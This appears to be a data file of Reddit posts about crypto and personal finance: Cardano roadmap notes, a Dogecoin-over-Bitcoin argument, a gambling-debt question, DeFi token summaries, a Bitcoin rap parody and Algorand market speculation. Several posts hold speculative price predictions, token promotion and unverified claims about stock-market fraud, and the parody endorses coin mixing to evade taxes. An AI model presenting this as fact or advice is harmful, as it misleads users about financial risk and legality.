8. Charles recently mentioned Senegal in the Julian Hosp interview. I believe that is the first time this nation state has been discussed in the context of the pan-African strategy for Cardano. [https://youtu.be/Zm6I1agqPWQ](https://youtu.be/Zm6I1agqPWQ)
9. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
10. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
11. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

13. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

18. Charles tweets a pic of a Turaco and John Hancock. It seems safe to assume this means the minister has signed or is signing the Ethiopia deal!

26. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.  [https://www.youtube.com/watch?v=dUDze81LCWs](https://www.youtube.com/watch?v=dUDze81LCWs)
27. Occam Association President, Mark Berger, also did an interview with Rick McCracken on Cardano Live. He provided some good detail on what Occam would like to deliver and where they currently are in their development.  [https://youtu.be/vTBLIZ7voz8](https://youtu.be/vTBLIZ7voz8)
28. Tomorrow we’ll hit the items from the roadmap video that Charles just did.
29. Cardano is now being used as a traceability solution in conjunction with Scantrust for wine from the Nation State of Georgia.  This is a great use case for the Cardano blockchain! [https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/ https://www.scantrust.com/](https://cardanofoundation.org/en/news/cardano-reveals-its-first-supply-chain-solution-in-association-with-scantrust/)
30. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
31. Ourobouros Omega.  Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ourobouros Praos was 2017 and it’s still running now.  Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
32. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
33. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
34. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.
35. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.
36. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this.
37. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
38. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
39. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting.
40. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

47. Dewayne Cameron was on Cardano Live.  Whether you are interested in DeFi or not, this is likely to be one of the big early Cardano based projects.  This interview has all the latest info on Liqwid.  Sounds like the alpha testnet will be end of April/early May with three or four core contracts. Rick does a really good job of asking questions that a large spectrum of listeners will be able to relate to and they get into the details of how the contracts will work.  At 20:01 Dewayne mentions a “Cardano Dex, or the Dex that IOHK and Emurgo are working on...”  Very interesting tidbit there! [https://youtu.be/JhO5iC08xSA](https://youtu.be/JhO5iC08xSA)

60. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.

dogecoin,Why is Bitcoin considered so much superior to Doge?,"Like most people, I was drawn into the crypto space by Bitcoin and I started researching about heavily since the last month or so. But then, again, just like most people, I was drawn into Doge because of Elon’s tweets. So, I started digging up a bit about Doge and I genuinely believe that Doge is a better CryptoCurrency than Bitcoin. I know I might sound crazy, but hear me out..

&amp;#x200B;

1. Doge’s supply is unlimited but it’s capped at 5 billion Dogecoins a year. Right now, the circulating supply is roughly 130 billion. So, in one year the supply increase will be around 3.8%. The following year, it will be 3.7%, followed by 3.5%...you get my point, this is what’s known as Disinflation, wherein the inflation rate keeps on falling over what and is usually is a significant contributor of price rise for goods and services. Now, what do we buy Doge with? Fiat....Just open up the US M2 supply chart and see the Y/Y change over the last decade. Even without the anomaly that is the 25% increase we saw last year, M2 supply has grown at an average yearly pace of &gt;5% per year. So, you have the purchasing unit growing at a fixed (even upwards trending rate) while the product (Doge) in this case sees declining supply growth. 

 Now, I know that right now a very small percentage of the Money available with the people is going to Crypto at this point, much less Doge. But we are also seeing a declining Velocity of M2. This means that even though there’s an increase in Real GDP (more output is being consumed), there’s a disinflationary pressure on prices of goods and services ( the average price of the output is rising at a slower pace), aided largely by advancements in technology. This is driving interest rates lower and stocks, gold, Bitcoin higher. This trend is bound to continue and we will soon start witnessing an even higher yearly increase in M2 due to Federal Gov payouts because of job erosions caused by tech and further declines in interest rates, powered by the Fed in an effort to promote spending. 

Why is this significant? Because a good portion of this rising M2 aided by high credit growth rate &amp; disinflationary costs of goods &amp; services will be parked in stocks &amp; cryptos. I also see a change in the change in the distribution of Treasury &amp; Bond holdings going forward with the Fed’s holding slowly diluting corporates and retail accounts.

So, we can expect a rising increase in M2, an increasing flow towards risk assets like Crypto led by a gradual move out of Debt investments and disinflationary prices of goods &amp; services. This should move the crypto market upwards but why is this good for Doge over Bitcoin?

&amp;#x200B;

1. Bitcoin is built on the idea of HODLing. People expect the price of Bitcoin to rise. People look at Bitcoin as a deflationary instrument which is also a great means of payment. So, here I pose the question, if you expect the price of BTC to rise significantly, why would you want to spend it? You would want to HODL it to the moon. In a way, we are seeing this in the EU &amp; Japan already. Even with expansive Central Bank Balance Sheet expansion, people are savers there since they expect the Euro to buy them more every passing year and thus there’s crippling deflation. With Bitcoin, this notion is amplified because everyone knows exactly how much Bitcoin is available and how much will be added to the supply every year and that there won’t be any supply left after all the 21 million coins are mined. Why would anyone want to transact with  BTC when its supply is limited and they can potentially sell it at a much bigger sum in the future?
2. With more people not willing to transact with BTC, miners will potentially be driven out of the network because their revenue streams will dry up, resulting in massive transaction fees and further reinforcing people’s tendency to hoard the asset and not using it to transact with. This might also result in the compromise of the network if miners are driven out. It might even lead to miners consolidating power, which is not good.
3. Doge, on the other hand doesn’t have a hardcap. It’s meant to be spent and is extremely marketable. Just look at the engagements garnered by brands tweeting about Doge. Doge is also much faster than Bitcoin and Eth and has much much lower fees, making it a hugely better Currency. Now I know, you might say that Layer 2 solutions are being built for Bitcoin &amp; Eth but then go and read the 3rd point. It doesn’t benefit miners. Merchants are also benefitted by accepting Cryptos like Doge because they save on interchange fees. Due to the extra attention companies accepting Doge tend to receive, we might even see attractive discounts &amp; other benefits passed on to users willing to pay by Doge. So, that puts an upward pressure on Doge’s pricing power. We can even say that if the M2 available for Doge keeps rising at a rate greater than the supply increase, the price of Doge will increase by the difference.
4. This should make the price of Doge keep shooting up regardless of the extra 5 billion coins minted per year. In fact because the price of Doge keeps going up, more miners would be willing to join the network and there would always be additional supply to reward them! This should also help in keeping the transaction fees low.

Currency thus should be inflationary. Bitcoin is an Asset, Doge is a Currency with properties of an Asset.

So, this is why, at this point I believe Doge has more potential as a cryptocurrency than Bitcoin. Yes, there could be other coins with better properties than both Bitcoin and Doge but Network effects are important when we are talking about currency &amp; these two are the clear favourites in that regard.

I maybe completely wrong &amp; PLEASE DON’T TAKE IT AS FINANCIAL ADVICE. But I do feel Doge is a rare currency that is effective both as a means of payment and as a store of purchasing power in the face of rising asset price inflation.

Please note, I am not a maximalist and I am looking for your arguments which prove me wrong and change my mind. Thanks.",cryptocurrency

personalfinance,Recently learned that my dad has a gambling addiction. Should he file for bankruptcy?,"Throwaway ‘cause my brother follows my other account. 

My dad used to have good credit and had a few thousand dollars in savings. He was very responsible in his finances and I knew him to be the cheapest person ever. But, a little over a year ago he discovered this online casino. 

I knew he played but never thought that he could burn that much money. (If I knew, I could’ve avoided all of this) He gambled all of his savings and maxed out most of his credit cards but to no luck. Now, he owes a total of over 20 thousand dollars for his five credit cards.

A few days ago, he opened up to me about all this. It was the first time I saw my dad cry. He regrets everything and promised not to play again. He gave me four of his credit cards and told me to hide them for the meantime. I even blocked the website where he plays. 

He made me promise not to tell my mom and siblings and asked me for help in paying off his credit card debt before my youngest sibling goes to college next year. But, I can only give at most 800 dollars a month (this money’s supposedly going to my savings since I was planning to move out in a few months) and he can only put 600 dollars a month into paying for his credit cards. That and the monthly interest would make it impossible to pay for everything in a year.

I was looking into credit consolidation but that requires good credit to get a low interest rate. (I can’t get a personal loan since my oldest credit line is less than a year old). Would applying for bankruptcy be a good move at this point?

Thank you for reading this far. I’d greatly appreciate any advice.",finance

defi,Smart Contracts - A Guide to the Basis of DeFi,"Since DeFi's foundation is built upon smart contracts, here's a quick guide to get you up to speed on what exactly smart contracts are! 

&amp;#x200B;

**What is a smart contract?**

A smart contract is a contract that is automatically executed once the terms of the contract are met. Smart contracts generally run on a decentralized blockchain where the details of the contract are open to view and the rules can't be changed. Ethereum is the most used blockchain for smart contracts, mainly due to its large ecosystem of Dapps. Smart contracts can be used for agreements between individuals, or agreements between a platform and a user.

When you deposit funds into a DeFi platform that gives you interest, a smart contract will be created which is responsible for automatically paying you interest and making sure the amount of interest you are receiving is correct. There are many other ways that Dapps use smart contracts, which is why they have become a popular and useful feature of Ethereum

&amp;#x200B;

**How smart contracts work?**

A smart contract is programmed to do tasks when certain terms are met. In their simplest form, they do a task *IF* something happens. For example, if you wanted to buy a house, the terms of that agreement could be put in a smart contract. In the terms it might say you have to pay 50 ETH to receive the house. The smart contract will be programmed to see *if* you have paid the 50 ETH, *then* it will give you ownership of the house. Since the smart contract is on the blockchain, its details are open for anybody to view and it is permanent so the rules cant be changed. Here, the smart contract did the jobs of the bank, a lawyer, and a real estate broker.

Essentially, a smart contract cuts out the middleman and allows parties to transact without needing to trust each other or a third party. If you wanted to take out a loan on a DeFi platform a smart contract would be created that has rules for your required collateral and your interest rate. The smart contract will charge you interest on your loan when it is required to, and if your collateral falls below a certain level it will become liquidated.

Since smart contracts can only do tasks that they have been programmed to do, it doesn't really make them “smart” since they can't bend the rules or give exceptions.

&amp;#x200B;

**Features of smart contracts**

**Automatic**

Smart contracts can operate independently and execute tasks automatically when the terms are met. No oversight or management is required.

**Permanent**

The rules of the smart contract can't be changed or altered. Once they are set, nobody can change it.

**Open**

The terms of smart contracts are open for anybody to view since they run on a public blockchain.

**Trustless**

Smart contracts allow two parties to interact without the need to trust each other, or a third party.

CryptoCurrency,A brief description of some of the best coins in DeFi and how the DeFi Pulse Index let's you invest in all of them [long],"For those of you unaware, there's an ETF-type coin on the Ethereum network that acts as an index fund of the top ERC-20 DeFi projects. It's known as the Defi Pulse Index (ticker: DPI), and it's a market-cap-weighted product, meaning that the larger the market cap, the more weight it's given in the index. With high gas fees, the benefits of such a product are self-evident. You can get exposure to the top Defi tokens with a single transaction. DPI lowers the barrier to entry since you don't need to have a large amount of capital to offset the Eth spent on gas. You can buy it [here!](https://www.tokensets.com/portfolio/dpi). Important note that while I do hold a significant portion of my portfolio in DPI, posting it here won't pump my bags simply because DPI is meant to be an index of coins, not a coin in itself. With that out of the way, let's get on to the descriptions!

Currently (as of 4/22/2021), the assets held in DPI in decreasing weight are as follows:


Token | Allocation% | Rank
---|---|---
Uniswap (UNI) | 27.00% | #9
Aave Token (AAVE) | 17.54% | #33
Maker (MKR) | 13.06% | #43
Synthetix Network Token (SNX) | 9.32% | #56
Compound (COMP) | 8.34% | #57
Sushi (SUSHI) | 6.87% | #68
Yearn (YFI) | 6.64% | #73
Ren (REN) | 2.94% | #116
Loopring (LRC) | 2.69% | #121
Kyber Network Crystal (KNC) | 2.41% |  #117

Harvest Finance (FARM) | 0.38% | #331
Cream (CREAM)| 0.25% | #420 (nice)
Meta (MTA) | 0.22% |  #570

One thing I wish Token Sets did was having a brief description of each token so I could know some of the more obscure tokens in the set. While researching each one, I figured I'd type up my findings so that way you all could learn too!

* **Uniswap (UNI):** Arguably the king 👑 of DeFi. The governance token for the DApp of the same name acts as a decentralized exchange and automated market maker (AMM). If there's an ERC20 token, you can trade it on Uniswap, provided there's liquidity to that token. The token was airdropped in September 2020 to users of the DApp. In under half a year, it ascended to the top 10. Uniswap says that its governance token facilitates a self-sustainable and publicly-owned network and maintains its autonomous quality.


* **Aave Token (AAVE):** Originally known as ETHLend when founded in 2017, Aave acts as a decentralized money market protocol where users can lend and borrow many different assets. Lenders earn interest by providing liquidity, and borrowers collateralized their assets to take out loans from the lenders.  AAVE is the native token that also acts as a governance token to allow community decisions in the project's direction. Users also have incentives to stake AAVE in the protocol to earn rewards and fees. Aave has been audited 13 times through Trail of Bits, Open Zeppelin, Consensys Diligence, Certik, Peckshield, and Certora.

* **Maker (MKR):** Maker is a smart contract lending platform similar to Aave, but here you can take out loans by locking up collateral in exchange for Dai, a stable coin attempting to be pegged to 1 USD. MKR is the governance token of the platform and allows holders to vote on proposals to the protocol. Another function of MKR is if debts exceed holdings, MKR is minted to make up the difference. The additional MKR is sold for Dai via debt auctions to prevent insolvency. If the opposite occurs, then the protocol sells Dai via a surplus auction for MKR, which is then burned.

* **Synthetix Network Token (SNX):** Synthetix is a decentralized synthetic asset issuance protocol launched in September 2017 under Havven. It's now the largest decentralized exchange for derivatives in DeF and primarily used as collateral to mint synthetic assets. SNX holders can stake their tokens on Mintr and create sUSD (synthetic United States Dollars). SNX is also used to earn rewards via exchange and stake rewards. Exchange rewards whenever a trade takes placed on the network and staking rewards are rewards from the protocol's inflationary monetary supply.

* **Compound (COMP):** Compound is a decentralized protocol that allows users to lend and borrow selected cryptocurrencies. It establishes money markets by pooling assets and algorithmically setting interest rates through the supply and demand of each asset. Users deposit their crypto assets into the protocol and receive cTokens in return and accrue interest by holding the cTokens. Once the assets are deposited, users can use them as collateral and borrow from Compound. COMP tokens are mainly used for protocol governance, and holders can suggest, debate, and implement changes to the protocol without relying on the Compound team. 

* **Sushi (SUSHI):** SushiSwap is a decentralized exchange that functions similarly to UniSwap. It's a fork of Uniswap that's not without controversy. Sushi drained around $800M worth of liquidity from Uniswap, which earned the name ""vampire attack."" Additionally, the anonymous creator known as Chef Nomi sold $14M SUSHI for Eth, which broke the community's trust in the project. The funds were eventually returned, and he removed himself from the project. To regain trust, the SushiSwap admin key was transferred to the founder of FTX. He split the key amongst nine different addresses. SUSHI is a governance token similar to UNI and is the latest addition to DPI. 

* **yearn.finance (YFI):** Yearn Finance provides lending aggregation, yield generation, and token issuance. It's a massive DeFi ecosystem that probably deserves a post in itself. YFI is a governance token for the Yearn Finance protocol and is used to vote and receive cash flows from the protocol fees. YFI is a community fair launched token distributed to early protocol users in July 2020. 

* **REN (REN):** As we exit the top 100 tokens, the projects become more and more obscure. Ren protocol is one of the more unique DeFi projects. It's a permissionless and trustless protocol that allows users to transfer tokens across different blockchains. REN tokens were originally meant to pay for transactional fees on its vision of being a ""dark pool"" decentralized exchange. It was later rebranded in 2019 to focus on DeFi. REN is now mainly used as a bond to operate the Darknodes, which function similarly to a validator node on a proof of stake blockchain. Ren allows users to take their bitcoin and convert it to an ERC-20 equivalent (renBTC) to interact with other Defi applications. To operate a Darknode, one needs to stake 100,000 REN as collateral. As an operator, entities earn a portion of the transaction fees during the swap. 

* **Loopring (LRC):** Looprigh is a decentralized exchange built on an Ethereum Layer-2 (L2) solution called zkRollup. It has both AMM-based and order book-based exchanges. As an L2 scaling solution, zkRollup migrates computations off the blockchain and only uses the Ethereum network as data and verification layers. This allows over 2,000 trades per second and a cost per trade well under a penny. LRC is the governance token for Loopring and was launched via an ICO in August 2017. The Loopring protocol was first deployed to Ethereum mainnet in December 2019. 

* **Kyber Network Crystal (KNC):** The Kyber Network is an on-chain liquidity protocol that aggregates liquidity from various sources to provide secure and instant transactions on any DApp. Kyber's goal is to enable DApps, decentralized exchanges, and other users access to liquidity pools at the best rates. Kyber seeks to allow developers to build products and services without worrying about the liquidity issue in DeFi. KNC is a utility token that users can stake in the KyberDAO to help govern the platform and earn staking rewards in Eth. They also determine the rewards that liquidity providers receive on the platform. 

* **Balancer (BAL):** Balancer is a multi-token automated market maker and functions as a self-balancing weighted portfolio protocol. It allows anyone to create or add liquidity to custom pools and earn trading fees. Other automated market makers use a constant product model. In contrast, Balancer uses a generalization formula that can be adjusted to any number of tokens at any amount of weightage. This is similar to how an index fund regularly rebalances assets based on the change in weights of the held assets to control risk and overexposure to a certain asset. BAL is the governance token for the Balancer Protocol. It's used to vote on proposals and steer the direction of the protocol. 

* **Harvest Finance (FARM):** Harvest Finance is an automatic yield farming protocol that helps traders take advantage of the latest DeFi platforms with the highest yield. It allows users with small balances to continuously harvest their yield as they'll avoid the high gas fees. FARM is Harvest Finance's governance token and allows holders to influence Harvest's treasury and future direction of the protocol. FARM token holders are also entitled to 30% of the protocol fees. 

* **Cream (CREAM):** Cream is a decentralized lending protocol and decentralized exchange that operates on Ethereum and Binance Smart Chain. The decentralized lending protocol was forked from Compound, and the decentralized exchange was forked from Balancer. It was acquired by Yearn.Finance and is now part of its ecosystem. CREAM acts as a governance token. Like other governance tokens, it allows holders to vote on the direction of the protocol. 

* **Meta (MTA):** mStable is an autonomous and non-custodial infrastructure for pegged-value crypto assets with MTA as mStable's governance token. The goal is to create assets that are better than the sum of their parts. MTA provides decentralized governance, and stakers of the token become a Meta Governor. This is one of the more interesting and complicated DeFi tokens around and hard to describe in a brief bullet point. 

So that's all the tokens held within the DeFi Pulse Index, and if you hold DPI, you're getting price exposure to all of them in a single transaction. However, these are not *all* the DeFi tokens one can invest in, and I certainly don't have time to list all the DeFi tokens here, so I'm going to list a few more projects that I find appealing which are in a sector that I feel that DPI lacks. That sector is leverage and derivatives. I'll disclose which that I'm invested in. 

* **UniMex Network (UMX):** Ranked #858 on CoinGecko. UniMex allows for on-chain margin trading executed through Uniswap liquidity. UMX stakers on the exchange earn a portion of the fees generated from opened positions on UniMex's exchange along with the parallel Binance Smart Chain exchange. I'm currently invested in this token as I'm bullish on the prospects of earning fees based on leveraged trades. 

* **AntiMatter (MATTER):** Ranked #663 on CoinGecko. AntiMatter is an on-chain DeFi derivative protocol that provides tokenized call and put options. It's a fairly new project, and I don't hold any MATTER tokens. Still, I'm bullish on it for the same reason I like UniMex and other governance tokens. The derivatives market is still a developing space in DeFi. Also, the cool factor is pretty up there. 

* **Alpha Finance Lab (ALPHA):** Ranked #163 on CoinGecko. Alpha Finance is a cross-chain DeFi platform that allows for leveraged yield farming and users to earn higher fees. ALPHA tokens act as a governance token for the Alpha Finance ecosystem. Still, as the products Alpha offers grow, new use-cases are planned, such as:

1. Utility (provide liquidity and receive protocol fees)
2. Work (access to more functionalities on Alpha products)
3. Interoperability (such as staking ALPHA to unlock interoperability features among Alpha products) 

I currently own no ALPHA, but just like the previous two coins, leveraged yield farming is a great and unique selling point that Alpha Finance provides. 

Those are all the tokens I'm aware of that provide decentralized leverage and derivatives. If you know more or have another DeFi project with potential, let me know in the comments! Thank you for reading! If you found this post informative *please* give it an upvote because this took a lot of time and effort to compile. If this gets enough attention I'd be happy to continue this to the other big index offered on Token Sets, the Metaverse Index (MVI)!

Bitcoin,TEN SAT COMMANDMENTS,"1, 2, 3, 4, 5, 6, 7, 8, 9

It's the ten sat commandments, what!

&amp;#x200B;

Can't tell me nothing about this FUD

Can't tell me nothing about these dips, this pump &amp; dump, this for my hustlin' hodlers

Hodlers on the reddit I ain't forget you hodlers, triple BTC!

&amp;#x200B;

I've been lurking on this sub for days, it’s made me an animal,

There’s rules to this shit, I wrote me a manual

A step-by-step booklet for you to get

Keep your sats on track, without your wallet being hacked

&amp;#x200B;

Rule Number Uno, never let no one know

How much bitty you hold cause you know

This digital gold breeds jealousy 'specially

If that scammer’s fucked up, you'll get your inbox filled up

&amp;#x200B;

Number 2, always do the same move

Don't you know that we DCA our chips and buy the dips?

Take it from your elders

They’ve done mad stacking when the market slips and Mr. paper hand flips

&amp;#x200B;

Number 3, never trust no-bo-dy

Verify everybody, run a  full fucking node

The protocol is open source so no excuse for not checking out that code.

&amp;#x200B;

Number 4, I know you heard this before

Not your keys, not your cheese.

&amp;#x200B;

Number 5, never sell to no whale when the price goes off the scale

I don't care about your lambo, shut up and and hodl!

&amp;#x200B;

Number 6, that goddamn credit? Dead it

You want leverage to time the fucking market? Shit man forget it!

&amp;#x200B;

7, this rule is so underrated

Keep your government and monetary policy completely separated!

Money printers will get up to the same old tricks and society will find itself in some serious shit

&amp;#x200B;

Number 8, always keep you pass phrase strictly on you !

Dem keystroke loggers can get you, that brain of yours can memorize words too!

&amp;#x200B;

Number 9 shoulda been Number 1 to me,

If you ain't tumbling stay the fuck from police

If feds think you're earning in bitcoin

They be sittin' in your kitchen, waiting to start taxin’

&amp;#x200B;

Number 10, a strong word against shitcoins

Strictly for dummies, not for homies

If you ain't got cash to lose, say ""hell no!""

'Cause they gon' be pumping and dumping rain sleet hail snow

&amp;#x200B;

Follow these rules you'll have mad coins to break up

If not, 24 years of fiat hyper-inflationary blowup

They just gonna keep printing and that cash is just going to keep on debasing

that's why  you need dem cyber hornets to protect your stash while you keep gaining

&amp;#x200B;

This decentralized network is fucking the central bank up,

heard in the last 12 years, it’s only gone up

Because after each halvin’, FOMO simply blows up

Gotta go gotta go, got more sats to stackup !

CryptoCurrency,Please help me understand / assess risk re: Stablecoin interest and the various methods used to pay it out,"Hello - I got into Crypto back in January. I know the sentiment around stablecoin is fairly poor in this thread, but I do believe it has a place in a well balanced portfolio. That being said, I wanted to ask the experts in this thread to either validate or correct my working knowledge / assumptions around two platforms:

**BlockFI - 8.6% APY - GUSD:**

As I understand it, this is interest paid out by BlockFI by some combination of interest rates they generate on their loans, rates they get from institutional investors by lending your stablecoin, and (potentially) burn rate from all their VC investors.

Rates can go down, but it's not clear to me if they're paying these rates out at a loss or not

**DONUT - 4% or \~4% variable - DAI:**

As I understand it, Donut takes your money with an easy on-ramp to DAI, then lends it through the Compound protocol. They shave 2% off whatever interest they get and give you the rest. Their FAQ says your principle is protected (as long as DAI is).

So - to me - DONUT feels on paper to be less risky, because the rates vary immediately and the only way you're getting a return is if it's a profitable endeavor already - whereas it's unclear to me whether BlockFI is actually profiting from the 8.6% they're paying out.

Is my understanding correct? Thoughts? The way this falls apart is if the money made on Compound protocol is similar to the way BlockFI does as an institution - in which case BlockFI is just doing what Compound does, but better.",cryptocurrency
algorand,"It's hard to ignore what's going on with the stock market right now, and I'm starting to think Algorand is in the perfect position.","Hey all, I hope you've had a wonderful morning. This post may be long, but I'm looking to stimulate some discussion about the current state of things. ***\*\*This is absolutely not any financial advice\*\**** because I'm an engineer not a businessman, I'm just presenting my analysis and looking to see how others feel about the situation. Please point out anything I got wrong or you disagree with, and don't believe anything I say without researching it yourself.

I'm not sure how well you guys follow the US markets or stock market reddit, but I'm sure at this point everyone has at least heard of the fiasco that is currently our market system. Whether you're involved first hand or not, it seems that something that has always tried to been hidden from the people is now starting to come to light. I remember seeing posts similar to what I'm referring to as long as a few months ago, but none really caught on and saw the momentum that it has in the past few days. For those who don't know and without going into too much detail, an ape who is renowned for his DD has made a recent post essentially blowing the lid off the secret cookie jar and allowing us normies to see into the abyss that Wall Street has been trying to hide from us for years. This is nothing new though, as there have been people trying to get these messages out for years and blow the whistle on the elite. *(See this* [*link*](https://spiramus.com/naked-short-and-greedy) *here for a book published in 2019 by a former worker of the very company I am about to mention.)*

Again, without going into too much detail it goes like this:

*A lot of the shares exchanged in the large US markets don't actually belong to those purchasing/trading them. Instead, we're essentially trading IOUs for a share that is locked up in a vault. This vault is owned by ONE company. One PRIVATE company, stemming from the transition of a paper based trading system to a computer based trading years ago. This private company controlling so many public companies and it's lack of regulation allow for illegal short selling and counterfeiting of shares.*

There is so much more to this story and I honestly recommend everyone to seek out the posts going further into detail about this. I SURELY have not done it justice, and some of these posts are extremely well written. ([Link](https://www.reddit.com/r/Superstonk/comments/mvk5dv/a_house_of_cards_part_1/) to yesterday's DD that sparked everything, I could try to find other posts about the topic if requested, but they shouldn't be too hard to find by searching that sub.)

Okay now back to the main idea. This topic has led to a lot of speculation that blockchain is the solution, and I agree. Blockchain would allow us to have relatively the same speed of transactions between parties, and the completely transparent public ledger allows for more transparency of what's going on in the market. The blockchain would also easily allow us to see who actually owns what shares, giving transparency and power back to the people.

***Now insert Algorand...***

One of the biggest gripes of these communities that I've seen in my last couple months here as an Algonaut is with our lack of marketing. While it would be nice, I believe we are still in a perfect position. Here are some of my reasons why:

1. We all know ALGO has the tech. Fast finality, up to 46,000 transactions per second, very low fees, yada yada. We know ALGO is the real deal, making it a great candidate for the blockchain capable of running US markets.
2. You've probably likely seen that the new SEC chairman is Gary Gensler. Our boy GG has a history of cracking down on Wall Street shenanigans. If you've been around the ALGO community awhile, you probably also know of GG's connection to MIT. Well we're also connected to MIT, but you probably already knew that too\*wink wink\*. It's also been pointed out to me that Gary and Silvio know each other personally, which was something I assumed to be true but did not want to include in case I was wrong(thanks u/_mvkoto :)). If GG needed some answers on how blockchain could help this or the situation, I'm sure the first thing he would've done is met with his homie Silvio to figure things out. I mean that would be like having Einstein's help on implementing something to do with relativity, or being able to call Stephen Hawking to help you figure out your homework assignment about black holes or quantum mechanics. (Okay this miiiight be a stretch, but you guys get the analogy. He literally knows one of the smartest minds in this field, there's almost no doubt he would be bouncing these ideas off of Silvio to see what he thinks.)
3. There has been recent speculation about MIT and the Fed discussing the digital dollar and the future of our currency and blockchain. Ahem, MIT.... maybe they know of a super-quick very reliable blockchain project that is capable of meeting the needs of this project that was founded by an insider who knows what he's doing? Hmmmmmm, I wonder. Anyways, this has just been some recent speculation in the community, but we know the government is in a sticky position right now and they have to do what's right. I think if the digital USD is developed on Algorand, then there's a very good chance that Algorand-powered markets are next up to be implemented.
